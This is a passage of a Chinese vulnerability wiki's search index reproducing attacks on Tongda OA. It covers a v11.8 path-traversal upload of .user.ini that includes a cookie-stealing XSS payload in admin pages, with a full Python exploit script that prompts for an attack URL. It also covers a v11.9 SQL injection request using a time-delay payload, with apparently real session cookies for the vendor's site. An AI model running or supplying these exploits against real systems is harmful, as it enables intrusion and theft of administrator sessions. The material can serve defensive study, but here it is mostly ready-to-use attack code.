\u4e0b\u8f7d\u5b8c\u6bd5\u70b9\u51fb\u5b89\u88c5\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8fd9\u91cc\u4f7f\u7528\u7684\u73af\u5883\u4e3a\u901a\u8fbe v11.6\u7248\u672c\uff0cv11.6\u7248\u672c\u4e2d\u7684\u6f0f\u6d1e\u5229\u7528\u8f83\u597d\uff0c\u5728 v11.7 \u540e\u7eed\u7248\u672c\u4e2d\u89c4\u5b9a\u4e86\u4e0a\u4f20\u8def\u5f84\uff0c\u5bfc\u81f4XSS\u5229\u7528\u4f1a\u6bd4\u8f83\u56f0\u96be \u51fa\u73b0\u6f0f\u6d1e\u7684\u6587\u4ef6\u4e3a webroot/general/hr/manage/staff_info/update.php <?php include_once \"inc/auth.inc.php\" ; include_once \"inc/utility_all.php\" ; include_once \"inc/utility_file.php\" ; include_once \"inc/utility_field.php\" ; include_once \"inc/utility_cache.php\" ; include_once \"general/system/log/annual_leave_log.php\" ; if ( strstr ( $BYNAME , \"/\" ) || strstr ( $BYNAME , \" \\\\ \" ) || strstr ( $BYNAME , \"..\" )) { Message ( _ ( \"\u9519\u8bef\" ), _ ( \"OA\u7528\u6237\u540d\u5305\u542b\u975e\u6cd5\u5b57\u7b26\uff01\" )); exit (); } include_once \"inc/header.inc.php\" ; echo \" \\r\\n <body class= \\\" bodycolor \\\" > \\r\\n \" ; echo \" \\r\\n <body class= \\\" bodycolor \\\" > \\r\\n \" ; $PHOTO_NAME0 = $_FILES [ \"ATTACHMENT\" ][ \"name\" ]; $ATTACHMENT = $_FILES [ \"ATTACHMENT\" ][ \"tmp_name\" ]; if ( $PHOTO_NAME0 != \"\" ) { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\" ; if ( ! file_exists ( $FULL_PATH )) { @ mkdir ( $FULL_PATH , 448 ); } $PHOTO_NAME = $USER_ID . substr ( $PHOTO_NAME0 , strrpos ( $PHOTO_NAME0 , \".\" )); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME ; td_copy ( $ATTACHMENT , $FILENAME ); if ( file_exists ( $ATTACHMENT )) { unlink ( $ATTACHMENT ); } if ( ! file_exists ( $FILENAME )) { Message ( _ ( \"\u9644\u4ef6\u4e0a\u4f20\u5931\u8d25\" ), _ ( \"\u539f\u56e0\uff1a\u9644\u4ef6\u6587\u4ef6\u4e3a\u7a7a\u6216\u6587\u4ef6\u540d\u592a\u957f\uff0c\u6216\u9644\u4ef6\u5927\u4e8e30\u5146\u5b57\u8282\uff0c\u6216\u6587\u4ef6\u8def\u5f84\u4e0d\u5b58\u5728\uff01\" )); Button_Back (); exit (); } } \u5728\u8fd9\u91cc\u53c2\u6570 $USER_ID \u662f\u53ef\u63a7\u7684\uff0c\u5e76\u4e14\u65e0\u8fc7\u6ee4\u5371\u9669\u7b26\u53f7\u5c31\u62fc\u63a5\u8fdb\u53bb\u4e86\uff0c\u90a3\u6211\u4eec\u4f20\u5165 ../../../ \u6211\u4eec\u5c31\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u4e86 \u7531\u4e8e\u901a\u8fbeOA \u7684\u6587\u4ef6\u4e0a\u4f20\u9650\u5236\u7684\u6b7b\u6b7b\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5229\u7528 PHP\u7684 .user.ini \u6587\u4ef6\u6765\u5305\u542b\u5176\u4ed6\u6587\u4ef6\uff0c\u8fd9\u91cc\u662f\u53ef\u4ee5\u7528\u4e8e\u5305\u542bXSS\u8bed\u53e5\u7684\u6587\u4ef6\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u4e0a\u4f20\u6587\u4ef6 \u5185\u5bb9\u4e3a auto_prepend_file=peiqi.log \u6211\u4eec\u60f3\u8981\u6700\u5927\u5316\u5229\u7528\u53ef\u4ee5\u4e0a\u4f20\u5728**\u9996\u9875\u6216\u8005\u7ba1\u7406\u5458** \u754c\u9762\uff0c\u5229\u7528\u81ea\u5b9a\u4e49\u5f39\u7a97\u6765\u6e17\u900f \u8fd9\u91cc\u5bf9\u7ba1\u7406\u5458\u9875\u9762 general \u76ee\u5f55\u4e0a\u4f20 \u8bf7\u6c42\u5305\u4e3a POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" \u63d0\u4ea4 -----------------------------17518323986548992951984057104-- \u5176\u4e2d USER_ID=../../general/.user \u4e3a\u4e0a\u4f20\u8def\u5f84 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log \u8fd9\u91cc\u62fc\u63a5\u540e\u4e0a\u4f20\u5c31\u53d8\u6210\u4e86 .user.ini \u8fd9\u91cc\u518d\u4e0a\u4f20 XSS\u6587\u4ef6 peiqi.log \u88ab\u5305\u542b\u8fdb\u53bb \u4e0a\u4f20\u540e\u6bcf\u6b21\u7ba1\u7406\u5458\u767b\u5f55\u540e\u90fd\u4f1a\u5e26\u7740Cookie\u8bf7\u6c42\u4e00\u6b21XSS\u5e73\u53f0 \u9493\u9c7c\u4ec0\u4e48\u7684\u4ee3\u7801\u5199\u5728peiqi.log\u6587\u4ef6\u91cc\u5c31\u597d\u5566 \u521a\u521a\u63d0\u5230\u4e86 v11.7\u7248\u672c\u4e0d\u65b9\u4fbf\u5229\u7528\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u540e\u7eed\u7248\u672c\u52a0\u4e0a\u4e86\u6587\u4ef6\u4e0a\u4f20\u7684\u89c4\u5b9a\u8def\u5f84 if ((strpos($source, \"webroot\") !== false) && (strpos($source, \"attachment\") === false)) { return false; } else { return true; } \u8def\u5f84\u4e2d\u5fc5\u987b\u8981\u5305\u542b webroot \u548c attachment \u624d\u53ef\u4ee5\u4e0a\u4f20 \u8fd9\u91ccXSS\u7684\u5229\u7528\u70b9\u67094\u4e2a\u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u6700\u6709\u51e0\u7387XSS\u7684\u4e3a**\u5b58\u50a8\u76ee\u5f55\u7ba1\u7406\u7684\u6587\u4ef6\u5939** \u7528\u540c\u6837\u7684\u65b9\u6cd5\u4e0a\u4f20\u5229\u7528\u6587\u4ef6\uff0c\u6bcf\u6b21\u5f53\u7ba1\u7406\u5458\u8bbe\u7f6e\u65f6\u5c31\u4f1a\u76d7\u53d6Cookie","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"\u56e0\u4e3a\u662fxss\u53ef\u80fd\u5bf9\u76ee\u6807\u6709\u5f71\u54cd\uff0c\u6240\u4ee5\u8fd9\u91ccPOC\u5728\u4e00\u4e2a\u4e0d\u5e38\u7528\u76ee\u5f55\u63a2\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e Cookie\u586b\u5199\u8bbf\u95ee\u540e\u53f0\u65f6\u7684Cookie, \u5176\u4e2d\u7684base64\u89e3\u7801\u66f4\u6539 PeiQi_Wiki\u4e3a \u81ea\u5df1\u7684XSS\u8bed\u53e5 v11.6\u53ca\u4ee5\u4e0b \u653b\u51fb /general \u548c /general/system/attachment \u76ee\u5f55\u8f83\u597d v11.6\u4ee5\u4e0a \u653b\u51fb /general/system/attachment \u76ee\u5f55\u8f83\u597d import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA < V11.8 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20.user.ini\u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_2 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20.user.ini\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 peiqi.log \u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_3 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20 peiqi.log \u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , Cookie ): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \\033 [0m\" . format ( target_url )) if \"PeiQi_Wiki\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u5305\u542b PeiQi_Wiki,\u5b58\u5728XSS\u6f0f\u6d1e, \u53ef\u53c2\u8003\u6587\u7ae0\u5199\u7684\u5229\u7528\u7248\u672c\u8fdb\u4e00\u6b65\u653b\u51fb \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u4e0d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Cookie = \"USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31\" POC_1 ( target_url , Cookie )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u53c2\u8003\u6587\u7ae0","text":"https://paper.seebug.org/1499/","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u901a\u8fbeOA v11.9 \u540e\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u901a\u8fbeOA v11.9 \u53ca\u4ee5\u4e0b\u7248\u672c\u4e2d\u7531\u4e8e\u67d0\u4e9b\u53c2\u6570\u8fc7\u6ee4\u4e0d\u5b8c\u5584\u5bfc\u81f4\u540e\u53f0\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u901a\u8fbeOA <= v11.9 \u73af\u5883\u642d\u5efa \u00b6 https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe \u53cc\u51fb\u5b89\u88c5 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u6587\u4ef6\u4f4d webroot/general/appbuilder/modules/portal/controllers/WorkbenchController.php public function actionUpsharestatus() { Yii::$app->response->format = yii\\web\\Response::FORMAT_JSON; $data = modules\\appdesign\\models\\AppUtils::toGBK($_POST); if (modules\\portal\\controllers\\intval($data[\"uid\"]) == $_SESSION[\"LOGIN_UID\"]) { modules\\portal\\models\\PortalWorkbench::updateAll(array(\"state\" => \"{$data[\"status\"]}\"), \"id={$data[\"id\"]}\"); } else if ($data[\"status\"] == 1) { modules\\portal\\models\\PortalWorkbenchState::deleteAll(array(\"wids\" => \"{$data[\"id\"]}\", \"uid\" => \"{$_SESSION[\"LOGIN_UID\"]}\")); } else { $Work = new modules\\portal\\models\\PortalWorkbenchState(); $Work->wids = $data[\"id\"]; $Work->uid = $_SESSION[\"LOGIN_UID\"]; $Work->save(); } $dataBack = array(\"status\" => 1, \"msg\" => modules\\portal\\controllers\\_(\"\u64cd\u4f5c\u6210\u529f\")); $dataBack = modules\\appdesign\\models\\AppUtils::toUTF8($dataBack); return $dataBack; } \u5176\u4e2d updateAll() \u51fd\u6570\u5e76\u6ca1\u6709\u4f7f\u7528\u9632\u6b62 SQL\u6ce8\u5165\u7684 sql_injection() \u6765\u9632\u6b62\u6ce8\u5165 webroot/inc/conn.php \u6240\u4ee5\u8fd9\u91cc\u5c31\u51fa\u73b0\u4e86 id \u53c2\u6570\u5b58\u5728\u6ce8\u5165\u7684\u60c5\u51b5\uff0c\u8bf7\u6c42\u5305\u5982\u4e0b POST /general/appbuilder/web/portal/workbench/upsharestatus HTTP/1.1 Host: oa.tongda2000.com Connection: close Content-Length: 36 Cache-Control: max-age=0 sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Origin: https://oa.tongda2000.com Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://oa.tongda2000.com/general/appbuilder/web/portal/workbench/upsharestatus Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: __root_domain_v=.tongda2000.com; SID_12=5ea03399; USER_NAME_COOKIE=chenqiang; Hm_lvt_7cbefde9059536a2b96aaafc134d625c=1617014067,1617196083; _qddaz=QD.677915359373668; PHPSESSID=nso4iqhvp2qi464eoavk2fn0c0; OA_USER_ID=chenqiang; SID_15=ded66d80; LAST_OPERATION_TIME=1617242241 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 uid=15&status=1&id=1;select sleep(4) \u6ce8\u610f uid\u53c2\u6570 \u8981\u4e3a\u5f53\u524d\u7528\u6237\u7684uid\u624d\u80fd\u5b8c\u6210\u8bf7\u6c42\uff0c\u53ef\u4ee5\u4f7f\u7528 burp \u904d\u5386\u67e5\u770b\u65f6\u95f4\u54cd\u5e94 \u4f8b\u5982\u8fd9\u91cc\u4f7f\u7528\u5b98\u7f51\u7684\u6d4b\u8bd5\u8d26\u6237 uid \u904d\u5386\u51fa\u4e3a 15 \u5982\u679cuid\u9519\u8bef\u5219\u4e0d\u4f1a\u51fa\u73b0\u65f6\u95f4\u5ef6\u8fdf\uff0c\u5c06\u8bf7\u6c42\u5305\u653e\u5165 Sqlmap\u8dd1\u4e00\u4e0b","title":"\u901a\u8fbeOA v11.9 \u540e\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u901a\u8fbeoa-v119-\u540e\u53f0sql\u6ce8\u5165\u6f0f\u6d1e","text":"","title":"\u901a\u8fbeOA v11.9 \u540e\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u901a\u8fbeOA v11.9 \u53ca\u4ee5\u4e0b\u7248\u672c\u4e2d\u7531\u4e8e\u67d0\u4e9b\u53c2\u6570\u8fc7\u6ee4\u4e0d\u5b8c\u5584\u5bfc\u81f4\u540e\u53f0\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u901a\u8fbeOA <= v11.9","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe \u53cc\u51fb\u5b89\u88c5","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6f0f\u6d1e\u6587\u4ef6\u4f4d webroot/general/appbuilder/modules/portal/controllers/WorkbenchController.php public function actionUpsharestatus() { Yii::$app->response->format = yii\\web\\Response::FORMAT_JSON; $data = modules\\appdesign\\models\\AppUtils::toGBK($_POST); if (modules\\portal\\controllers\\intval($data[\"uid\"]) == $_SESSION[\"LOGIN_UID\"]) { modules\\portal\\models\\PortalWorkbench::updateAll(array(\"state\" => \"{$data[\"status\"]}\"), \"id={$data[\"id\"]}\"); } else if ($data[\"status\"] == 1) { modules\\portal\\models\\PortalWorkbenchState::deleteAll(array(\"wids\" => \"{$data[\"id\"]}\", \"uid\" => \"{$_SESSION[\"LOGIN_UID\"]}\")); } else { $Work = new modules\\portal\\models\\PortalWorkbenchState(); $Work->wids = $data[\"id\"]; $Work->uid = $_SESSION[\"LOGIN_UID\"]; $Work->save(); } $dataBack = array(\"status\" => 1, \"msg\" => modules\\portal\\controllers\\_(\"\u64cd\u4f5c\u6210\u529f\")); $dataBack = modules\\appdesign\\models\\AppUtils::toUTF8($dataBack); return $dataBack; } \u5176\u4e2d updateAll() \u51fd\u6570\u5e76\u6ca1\u6709\u4f7f\u7528\u9632\u6b62 SQL\u6ce8\u5165\u7684 sql_injection() \u6765\u9632\u6b62\u6ce8\u5165 webroot/inc/conn.php \u6240\u4ee5\u8fd9\u91cc\u5c31\u51fa\u73b0\u4e86 id \u53c2\u6570\u5b58\u5728\u6ce8\u5165\u7684\u60c5\u51b5\uff0c\u8bf7\u6c42\u5305\u5982\u4e0b POST /general/appbuilder/web/portal/workbench/upsharestatus HTTP/1.1 Host: oa.tongda2000.com Connection: close Content-Length: 36 Cache-Control: max-age=0 sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Origin: https://oa.tongda2000.com Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://oa.tongda2000.com/general/appbuilder/web/portal/workbench/upsharestatus Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: __root_domain_v=.tongda2000.com; SID_12=5ea03399; USER_NAME_COOKIE=chenqiang; Hm_lvt_7cbefde9059536a2b96aaafc134d625c=1617014067,1617196083; _qddaz=QD.677915359373668; PHPSESSID=nso4iqhvp2qi464eoavk2fn0c0; OA_USER_ID=chenqiang; SID_15=ded66d80; LAST_OPERATION_TIME=1617242241 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 uid=15&status=1&id=1;select sleep(4) \u6ce8\u610f uid\u53c2\u6570 \u8981\u4e3a\u5f53\u524d\u7528\u6237\u7684uid\u624d\u80fd\u5b8c\u6210\u8bf7\u6c42\uff0c\u53ef\u4ee5\u4f7f\u7528 burp \u904d\u5386\u67e5\u770b\u65f6\u95f4\u54cd\u5e94 \u4f8b\u5982\u8fd9\u91cc\u4f7f\u7528\u5b98\u7f51\u7684\u6d4b\u8bd5\u8d26\u6237 uid \u904d\u5386\u51fa\u4e3a 15 \u5982\u679cuid\u9519\u8bef\u5219\u4e0d\u4f1a\u51fa\u73b0\u65f6\u95f4\u5ef6\u8fdf\uff0c\u5c06\u8bf7\u6c42\u5305\u653e\u5165 